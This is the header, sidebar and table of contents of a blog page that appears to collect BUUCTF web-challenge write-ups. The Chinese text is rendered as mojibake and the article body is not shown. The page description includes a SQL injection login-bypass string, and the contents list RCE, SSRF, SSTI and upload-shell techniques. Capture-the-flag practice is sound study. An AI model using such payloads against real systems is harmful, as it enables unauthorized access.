<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="buuctf 1„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]EasySQL ËøõÂéªÁåúÈó≠ÂêàÊñπÂºè\nÂçïÂºïÂè∑Èó≠Âêà\nÂ∞ùËØï‰∏áËÉΩÂØÜÁ†ÅÁôªÂÖ•\n1 2 username=1&#39; or true# password=1&#39; or true# 2„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Havefun Êü•ÁúãÊ∫êÁ†ÅË¶Åget‰º†catÁöÑÂÄº‰∏∫dog\n1 ?cat=dog 3„ÄÅ[HCTF 2018]WarmUp Êü•ÁúãÊ∫êÁ†Åsource.php\nÁôΩÂêçÂçïÂè™Êúâsource.phpÂíåhint.php,Êñá‰ª∂ÂåÖÂê´‰º†fileÂèÇÊï∞,‰∏îÊúâ?Êà™Êñ≠\n">
<title>buuctfÂà∑È¢ò</title>

<link rel='canonical' href='https://0d000721999.github.io/p/buuctf%E5%88%B7%E9%A2%98/'>

<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="buuctfÂà∑È¢ò">
<meta property='og:description' content="buuctf 1„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]EasySQL ËøõÂéªÁåúÈó≠ÂêàÊñπÂºè\nÂçïÂºïÂè∑Èó≠Âêà\nÂ∞ùËØï‰∏áËÉΩÂØÜÁ†ÅÁôªÂÖ•\n1 2 username=1&#39; or true# password=1&#39; or true# 2„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Havefun Êü•ÁúãÊ∫êÁ†ÅË¶Åget‰º†catÁöÑÂÄº‰∏∫dog\n1 ?cat=dog 3„ÄÅ[HCTF 2018]WarmUp Êü•ÁúãÊ∫êÁ†Åsource.php\nÁôΩÂêçÂçïÂè™Êúâsource.phpÂíåhint.php,Êñá‰ª∂ÂåÖÂê´‰º†fileÂèÇÊï∞,‰∏îÊúâ?Êà™Êñ≠\n">
<meta property='og:url' content='https://0d000721999.github.io/p/buuctf%E5%88%B7%E9%A2%98/'>
<meta property='og:site_name' content='ÁæéÂíïÂôúÁöÑÂ∞èÁ´ô'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Âà∑È¢ò' /><meta property='article:published_time' content='2025-01-10T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-01-10T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/buuctf%E5%88%B7%E9%A2%98/1.png' />
<meta name="twitter:title" content="buuctfÂà∑È¢ò">
<meta name="twitter:description" content="buuctf 1„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]EasySQL ËøõÂéªÁåúÈó≠ÂêàÊñπÂºè\nÂçïÂºïÂè∑Èó≠Âêà\nÂ∞ùËØï‰∏áËÉΩÂØÜÁ†ÅÁôªÂÖ•\n1 2 username=1&#39; or true# password=1&#39; or true# 2„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Havefun Êü•ÁúãÊ∫êÁ†ÅË¶Åget‰º†catÁöÑÂÄº‰∏∫dog\n1 ?cat=dog 3„ÄÅ[HCTF 2018]WarmUp Êü•ÁúãÊ∫êÁ†Åsource.php\nÁôΩÂêçÂçïÂè™Êúâsource.phpÂíåhint.php,Êñá‰ª∂ÂåÖÂê´‰º†fileÂèÇÊï∞,‰∏îÊúâ?Êà™Êñ≠\n"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://0d000721999.github.io/p/buuctf%E5%88%B7%E9%A2%98/1.png' />
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "light");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="ÂàáÊç¢ËèúÂçï">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu988272603220494224.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üòã</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">ÁæéÂíïÂôúÁöÑÂ∞èÁ´ô</a></h1>
            <h2 class="site-description">CialloÔΩû(‚à†„Éªœâ&lt; )‚åí‚òÖ</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://buuoj.cn/users/175721'
                        target="_blank"
                        title="BUUOJ"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
  <line x1="7" y1="12" x2="13" y2="12" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/0d000721999'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>‰∏ªÈ°µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>ÂÖ≥‰∫é</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                
                <span>Friends</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ÁõÆÂΩï</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#1ÊûÅÂÆ¢Â§ßÊåëÊàò-2019easysql">1„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]EasySQL</a></li>
    <li><a href="#2ÊûÅÂÆ¢Â§ßÊåëÊàò-2019havefun">2„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Havefun</a></li>
    <li><a href="#3hctf-2018warmup">3„ÄÅ[HCTF 2018]WarmUp</a></li>
    <li><a href="#4actf2020-Êñ∞ÁîüËµõinclude">4„ÄÅ[ACTF2020 Êñ∞ÁîüËµõ]Include</a></li>
    <li><a href="#5actf2020-Êñ∞ÁîüËµõexec">5„ÄÅ[ACTF2020 Êñ∞ÁîüËµõ]Exec</a></li>
    <li><a href="#6gxyctf2019ping-ping-ping">6„ÄÅ[GXYCTF2019]Ping Ping Ping</a>
      <ol>
        <li><a href="#ÊñπÊ≥ï‰∏ÄÂèòÈáèÊãºÊé•Â≠óÁ¨¶‰∏≤Â∞ÜaÁöÑÂÄºË¶ÜÁõñÁÑ∂ÂêéËøõË°åÁªïËøá">ÊñπÊ≥ï‰∏ÄÔºö<strong>ÂèòÈáèÊãºÊé•Â≠óÁ¨¶‰∏≤‚Äî‚ÄîÂ∞ÜaÁöÑÂÄºË¶ÜÁõñÔºåÁÑ∂ÂêéËøõË°åÁªïËøá</strong></a></li>
        <li><a href="#ÊñπÊ≥ï‰∫åÂÜÖËÅîÊâßË°å"><strong>ÊñπÊ≥ï‰∫åÔºöÂÜÖËÅîÊâßË°å</strong></a></li>
        <li><a href="#ÊñπÊ≥ï‰∏âshÂëΩ‰ª§Êù•ÊâßË°å"><strong>ÊñπÊ≥ï‰∏âÔºöshÂëΩ‰ª§Êù•ÊâßË°å</strong></a></li>
      </ol>
    </li>
    <li><a href="#7suctf-2019easysql">7„ÄÅ[SUCTF 2019]EasySQL</a>
      <ol>
        <li><a href="#ÊñπÊ≥ï‰∏Ä‰ΩøÁî®-sql_mode-‰∏≠ÁöÑ-pipes_as_concat-ÂáΩÊï∞">ÊñπÊ≥ï‰∏ÄÔºö‰ΩøÁî® sql_mode ‰∏≠ÁöÑ PIPES_AS_CONCAT ÂáΩÊï∞</a></li>
        <li><a href="#ÊñπÊ≥ï‰∫åÂà©Áî®ÈùûÈ¢ÑÊúüÊºèÊ¥ûËé∑Âèñflag">ÊñπÊ≥ï‰∫åÔºöÂà©Áî®ÈùûÈ¢ÑÊúüÊºèÊ¥ûËé∑Âèñflag</a></li>
      </ol>
    </li>
    <li><a href="#8ÊûÅÂÆ¢Â§ßÊåëÊàò-2019lovesql">8„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]LoveSQL</a></li>
    <li><a href="#9Âº∫ÁΩëÊùØ-2019Èöè‰æøÊ≥®">9„ÄÅ[Âº∫ÁΩëÊùØ 2019]Èöè‰æøÊ≥®</a></li>
    <li><a href="#10ÊûÅÂÆ¢Â§ßÊåëÊàò-2019secret-file">10„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Secret File</a></li>
    <li><a href="#11ÊûÅÂÆ¢Â§ßÊåëÊàò-2019http">11„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Http</a></li>
    <li><a href="#12ÊûÅÂÆ¢Â§ßÊåëÊàò-2019upload">12„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Upload</a></li>
    <li><a href="#13ÊûÅÂÆ¢Â§ßÊåëÊàò-2019knife">13„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]Knife</a></li>
    <li><a href="#14actf2020-Êñ∞ÁîüËµõupload">14„ÄÅ[ACTF2020 Êñ∞ÁîüËµõ]Upload</a></li>
    <li><a href="#15ÊûÅÂÆ¢Â§ßÊåëÊàò-2019babysql">15„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]BabySQL</a></li>
    <li><a href="#16ÊûÅÂÆ¢Â§ßÊåëÊàò-2019php">16„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]PHP</a></li>
    <li><a href="#17actf2020-Êñ∞ÁîüËµõbackupfile">17„ÄÅ[ACTF2020 Êñ∞ÁîüËµõ]BackupFile</a></li>
    <li><a href="#18roarctf-2019easy-calc">18„ÄÅ[RoarCTF 2019]Easy Calc</a></li>
    <li><a href="#19ÊûÅÂÆ¢Â§ßÊåëÊàò-2019buyflag">19„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]BuyFlag</a></li>
    <li><a href="#20bjdctf2020easy-md5">20„ÄÅBJDCTF2020]Easy MD5</a>
      <ol>
        <li><a href="#md5ÂáΩÊï∞">md5ÂáΩÊï∞</a></li>
      </ol>
    </li>
    <li><a href="#21hctf-2018admin">21„ÄÅ[HCTF 2018]admin</a></li>
    <li><a href="#22mrctf2020‰Ω†‰º†‰Ω†Âë¢">22„ÄÅ[MRCTF2020]‰Ω†‰º†‰Ω†üêéÂë¢</a></li>
    <li><a href="#23zjctf-2019nizhuansiwei">23„ÄÅ[ZJCTF 2019]NiZhuanSiWei</a></li>
    <li><a href="#24ÊûÅÂÆ¢Â§ßÊåëÊàò-2019hardsql">24„ÄÅ[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]HardSQL</a></li>
    <li><a href="#ÁΩëÈºéÊùØ-2020-ÈùíÈæôÁªÑareuserialz">[ÁΩëÈºéÊùØ 2020 ÈùíÈæôÁªÑ]AreUSerialz</a></li>
    <li><a href="#gxyctf2019babysqli">[GXYCTF2019]BabySQli</a></li>
    <li><a href="#gyctf2020blacklist">[GYCTF2020]Blacklist</a></li>
    <li><a href="#ciscn2019-ÂçéÂåóËµõÂå∫-day2-web1hack-world">[CISCN2019 ÂçéÂåóËµõÂå∫ Day2 Web1]Hack World</a></li>
    <li><a href="#roarctf-2019easy-java">[RoarCTF 2019]Easy Java</a></li>
    <li><a href="#bsidescf-2020had-a-bad-day">[BSidesCF 2020]Had a bad day</a></li>
    <li><a href="#ÁΩëÈºéÊùØ-2020-Êú±ÈõÄÁªÑphpweb">[ÁΩëÈºéÊùØ 2020 Êú±ÈõÄÁªÑ]phpweb</a></li>
    <li><a href="#bjdctf2020the-mystery-of-ip">[BJDCTF2020]The mystery of ip</a></li>
    <li><a href="#bjdctf2020zjctf‰∏çËøáÂ¶ÇÊ≠§">[BJDCTF2020]ZJCTFÔºå‰∏çËøáÂ¶ÇÊ≠§</a></li>
    <li><a href="#buuctf-2018online-tool">[BUUCTF 2018]Online Tool</a></li>
    <li><a href="#gxyctf2019Á¶ÅÊ≠¢Â•óÂ®É">[GXYCTF2019]Á¶ÅÊ≠¢Â•óÂ®É</a></li>
    <li><a href="#nctf2019fake-xml-cookbook">[NCTF2019]Fake XML cookbook</a></li>
    <li><a href="#gwctf-2019ÊàëÊúâ‰∏Ä‰∏™Êï∞ÊçÆÂ∫ì">[GWCTF 2019]ÊàëÊúâ‰∏Ä‰∏™Êï∞ÊçÆÂ∫ì</a></li>
    <li><a href="#bjdctf2020mark-loves-cat">[BJDCTF2020]Mark loves cat</a></li>
    <li><a href="#wustctf2020Êú¥ÂÆûÊó†Âçé">[WUSTCTF2020]Êú¥ÂÆûÊó†Âçé</a></li>
    <li><a href="#bjdctf2020cookie-is-so-stable">[BJDCTF2020]Cookie is so stable</a></li>
    <li><a href="#ciscn2019-Âçé‰∏úÂçóËµõÂå∫web11">[CISCN2019 Âçé‰∏úÂçóËµõÂå∫]Web11</a></li>
    <li><a href="#mrctf2020ezpop">[MRCTF2020]Ezpop</a></li>
    <li><a href="#ÂÆâÊ¥µÊùØ-2019easy_web">[ÂÆâÊ¥µÊùØ 2019]easy_web</a></li>
    <li><a href="#mrctf2020pywebsite">[MRCTF2020]PYWebsite</a></li>
    <li><a href="#ÂÆâÊ¥µÊùØ-2019easy_serialize_php">[ÂÆâÊ¥µÊùØ 2019]easy_serialize_php</a>
      <ol>
        <li><a href="#phpÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶ÈÄÉÈÄ∏">phpÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶ÈÄÉÈÄ∏</a></li>
      </ol>
    </li>
    <li><a href="#Âº∫ÁΩëÊùØ-2019È´òÊòéÁöÑÈªëÂÆ¢">[Âº∫ÁΩëÊùØ 2019]È´òÊòéÁöÑÈªëÂÆ¢</a></li>
    <li><a href="#ÁΩëÈºéÊùØ-2020-Êú±ÈõÄÁªÑnmap">[ÁΩëÈºéÊùØ 2020 Êú±ÈõÄÁªÑ]Nmap</a></li>
    <li><a href="#npuctf2020readlezphp">[NPUCTF2020]ReadlezPHP</a></li>
    <li><a href="#swpu2019web1">[SWPU2019]Web1</a>
      <ol>
        <li><a href="#Êó†ÂàóÂêçÊ≥®ÂÖ•">Êó†ÂàóÂêçÊ≥®ÂÖ•</a></li>
      </ol>
    </li>
    <li><a href="#ÊûÅÂÆ¢Â§ßÊåëÊàò-2019finalsql">[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]FinalSQL</a></li>
    <li><a href="#ciscn-2019-ÂàùËµõlove-math">[CISCN 2019 ÂàùËµõ]Love Math</a></li>
    <li><a href="#ÊûÅÂÆ¢Â§ßÊåëÊàò-2019rce-me">[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]RCE ME</a></li>
    <li><a href="#de1ctf-2019ssrf-me">[De1CTF 2019]SSRF Me</a></li>
    <li><a href="#bjdctf2020easysearch">[BJDCTF2020]EasySearch</a>
      <ol>
        <li><a href="#apache-ssi-ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûssiÊ≥®ÂÖ•ÊºèÊ¥û">Apache SSI ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºàSSIÊ≥®ÂÖ•ÊºèÊ¥ûÔºâ</a></li>
      </ol>
    </li>
    <li><a href="#gyctf2020flaskapp">[GYCTF2020]FlaskApp</a>
      <ol>
        <li><a href="#pythonÁöÑflaskÊ®°ÊùøÊ≥®ÂÖ•debugÊ®°ÂºèÂà©Áî®pinÁ†ÅËøõË°årce">pythonÁöÑflaskÊ®°ÊùøÊ≥®ÂÖ•debugÊ®°ÂºèÂà©Áî®PINÁ†ÅËøõË°åRCE</a></li>
      </ol>
    </li>
    <li><a href="#wustctf2020È¢úÂÄºÊàêÁª©Êü•ËØ¢">[WUSTCTF2020]È¢úÂÄºÊàêÁª©Êü•ËØ¢</a></li>
    <li><a href="#fbctf2019rceservice">[FBCTF2019]RCEService</a></li>
    <li><a href="#suctf-2019pythonginx">[SUCTF 2019]Pythonginx</a></li>
    <li><a href="#0ctf-2016piapiapia">[0CTF 2016]piapiapia</a></li>
    <li><a href="#zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?</a></li>
    <li><a href="#mrctf2020Â•óÂ®É">[MRCTF2020]Â•óÂ®É</a></li>
    <li><a href="#cscctf-2019-qualflasklight">[CSCCTF 2019 Qual]FlaskLight</a></li>
    <li><a href="#watevrctf-2019cookie-store">[watevrCTF-2019]Cookie Store</a></li>
    <li><a href="#wustctf2020cv-maker">[WUSTCTF2020]CV Maker</a></li>
    <li><a href="#ciscn2019-ÂçéÂåóËµõÂå∫-day1-web2ikun">[CISCN2019 ÂçéÂåóËµõÂå∫ Day1 Web2]ikun</a></li>
    <li><a href="#Á∫¢ÊòéË∞∑ctf-2021write_shell">[Á∫¢ÊòéË∞∑CTF 2021]write_shell</a></li>
    <li><a href="#watevrctf-2019pickle-store">[watevrCTF-2019]Pickle Store</a></li>
    <li><a href="#rctf2015easysql">[RCTF2015]EasySQL</a></li>
    <li><a href="#gwctf-2019ÊûØÁá•ÁöÑÊäΩÂ•ñ">[GWCTF 2019]ÊûØÁá•ÁöÑÊäΩÂ•ñ</a></li>
    <li><a href="#nctf2019true-xml-cookbook">[NCTF2019]True XML cookbook</a></li>
    <li><a href="#ciscn2019-ÂçéÂåóËµõÂå∫-day1-web5cyberpunk">[CISCN2019 ÂçéÂåóËµõÂå∫ Day1 Web5]CyberPunk</a></li>
    <li><a href="#wmctf2020make-php-great-again">[WMCTF2020]Make PHP Great Again</a></li>
    <li><a href="#ÁΩëÈºéÊùØ-2020-ÁôΩËôéÁªÑpicdown">[ÁΩëÈºéÊùØ 2020 ÁôΩËôéÁªÑ]PicDown</a></li>
    <li><a href="#hitcon-2017ssrfme">[HITCON 2017]SSRFme</a></li>
    <li><a href="#ciscn2019-ÂçéÂåóËµõÂå∫-day1-web1dropbox">[CISCN2019 ÂçéÂåóËµõÂå∫ Day1 Web1]Dropbox</a></li>
    <li><a href="#hfctf2020easylogin">[HFCTF2020]EasyLogin</a>
      <ol>
        <li><a href="#koaÊ°ÜÊû∂Âü∫Êú¨ÁõÆÂΩï">koaÊ°ÜÊû∂Âü∫Êú¨ÁõÆÂΩï</a></li>
      </ol>
    </li>
    <li><a href="#swpuctf-2018simplephp">[SWPUCTF 2018]SimplePHP</a></li>
    <li><a href="#october-2019-twice-sql-injection">October 2019 Twice SQL Injection</a></li>
    <li><a href="#gyctf2020ezsqli">[GYCTF2020]Ezsqli</a></li>
    <li><a href="#ciscn2019-ÊÄªÂÜ≥Ëµõ-day2-web1easyweb">[CISCN2019 ÊÄªÂÜ≥Ëµõ Day2 Web1]Easyweb</a></li>
    <li><a href="#rootersctf2019i_3_flask">[RootersCTF2019]I_&lt;3_Flask</a></li>
    <li><a href="#npuctf2020ezinclude">[NPUCTF2020]ezinclude</a>
      <ol>
        <li><a href="#Ê≥ï‰∏ÄÂà©Áî®php7-segment-faultÁâπÊÄßcve-2018-14884">Ê≥ï‰∏ÄÔºöÂà©Áî®php7 segment faultÁâπÊÄßÔºàCVE-2018-14884Ôºâ</a></li>
        <li><a href="#Ê≥ï‰∫åÂà©Áî®-sessionupload_progress-ËøõË°å-session-Êñá‰ª∂ÂåÖÂê´">Ê≥ï‰∫åÔºöÂà©Áî® session.upload_progress ËøõË°å session Êñá‰ª∂ÂåÖÂê´</a></li>
      </ol>
    </li>
    <li><a href="#nctf2019sqli">[NCTF2019]SQLi</a></li>
    <li><a href="#ÁΩëÈºéÊùØ-2020-ÂçäÂÜ≥Ëµõalicewebsite">[ÁΩëÈºéÊùØ 2020 ÂçäÂÜ≥Ëµõ]AliceWebsite</a></li>
    <li><a href="#harekazectf2019encode_and_encode">[HarekazeCTF2019]encode_and_encode</a></li>
    <li><a href="#suctf-2019easyweb">[SUCTF 2019]EasyWeb</a></li>
    <li><a href="#ciscn2019-Âçé‰∏úÂçóËµõÂå∫double-secret">[CISCN2019 Âçé‰∏úÂçóËµõÂå∫]Double Secret</a></li>
    <li><a href="#gkctf-2021easycms">[GKCTF 2021]easycms</a></li>
    <li><a href="#bjdctf2020ezphp">[BJDCTF2020]EzPHP</a></li>
    <li><a href="#gyctf2020easythinking">[GYCTF2020]EasyThinking</a></li>
    <li><a href="#gxyctf2019strongestmind">[GXYCTF2019]StrongestMind</a></li>
    <li><a href="#hfctf2020justescape">[HFCTF2020]JustEscape</a></li>
    <li><a href="#suctf-2018getshell">[SUCTF 2018]GetShell</a></li>
    <li><a href="#b01lers2020life-on-mars">[b01lers2020]Life on Mars</a></li>
    <li><a href="#easybypass">EasyBypass</a></li>
    <li><a href="#ÊûÅÂÆ¢Â§ßÊåëÊàò-2020roamphp1-welcome">[ÊûÅÂÆ¢Â§ßÊåëÊàò 2020]Roamphp1-Welcome</a></li>
    <li><a href="#csawqual-2019web_unagi">[CSAWQual 2019]Web_Unagi</a></li>
    <li><a href="#mrctf2020ezaudit">[MRCTF2020]Ezaudit</a></li>
    <li><a href="#bsidescf-2019svgmagic">[BSidesCF 2019]SVGMagic</a></li>
    <li><a href="#isitdtu-2019easyphp">[ISITDTU 2019]EasyPHP</a></li>
    <li><a href="#ÁæäÂüéÊùØ2020easyphp">[ÁæäÂüéÊùØ2020]easyphp</a></li>
    <li><a href="#fireshellctf2020caas">[FireshellCTF2020]Caas</a></li>
    <li><a href="#harekazectf2019avatar-uploader-1">[HarekazeCTF2019]Avatar Uploader 1</a></li>
    <li><a href="#sctf2019flag-shop">[SCTF2019]Flag Shop</a></li>
    <li><a href="#n1ctf-2018eating_cms">[N1CTF 2018]eating_cms</a></li>
    <li><a href="#gyctf2020easyphp">[GYCTF2020]Easyphp</a></li>
    <li><a href="#suctf-2018multisql">[SUCTF 2018]MultiSQL</a></li>
    <li><a href="#suctf-2018annonymous">[SUCTF 2018]annonymous</a></li>
    <li><a href="#rootersctf2019babyweb">[RootersCTF2019]babyWeb</a></li>
    <li><a href="#ÂÆâÊ¥µÊùØ-2019‰∏çÊòØÊñá‰ª∂‰∏ä‰º†">[ÂÆâÊ¥µÊùØ 2019]‰∏çÊòØÊñá‰ª∂‰∏ä‰º†</a></li>
    <li><a href="#Âº∫ÁΩëÊùØ-2019upload">[Âº∫ÁΩëÊùØ 2019]Upload</a></li>
    <li><a href="#ciscn2019-Âçé‰∏úÂçóËµõÂå∫web4">[CISCN2019 Âçé‰∏úÂçóËµõÂå∫]Web4</a></li>
    <li><a href="#gxyctf2019babysqliv30">[GXYCTF2019]BabysqliV3.0</a></li>
    <li><a href="#pasecactf_2019flask_ssti">[pasecactf_2019]flask_ssti</a></li>
    <li><a href="#eis-2019ezpop">[EIS 2019]EzPOP</a></li>
    <li><a href="#gwctf-2019mypassword">[GWCTF 2019]mypassword</a></li>
    <li><a href="#hfctf2020babyupload">[HFCTF2020]BabyUpload</a></li>
    <li><a href="#swpu2019web4">[SWPU2019]Web4</a></li>
    <li><a href="#ÂÆâÊ¥µÊùØ-2019iamthinking">[ÂÆâÊ¥µÊùØ 2019]iamthinking</a></li>
    <li><a href="#paseca2019honey_shop">[PASECA2019]honey_shop</a></li>
    <li><a href="#black-watch-ÂÖ•Áæ§È¢òweb">[Black Watch ÂÖ•Áæ§È¢ò]Web</a></li>
    <li><a href="#googlectf2019-qualsbnv">[GoogleCTF2019 Quals]Bnv</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/buuctf%E5%88%B7%E9%A2%98/">
                <img src="/p/buuctf%E5%88%B7%E9%A2%98/1.png"
                        
                        width="1920" 
                        height="1080" 
                        loading="lazy"
                        alt="Featured image of post buuctfÂà∑È¢ò" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E5%88%B7%E9%A2%98%E6%89%93%E9%9D%B6/" style="background-color: #264653; color: #fff;">
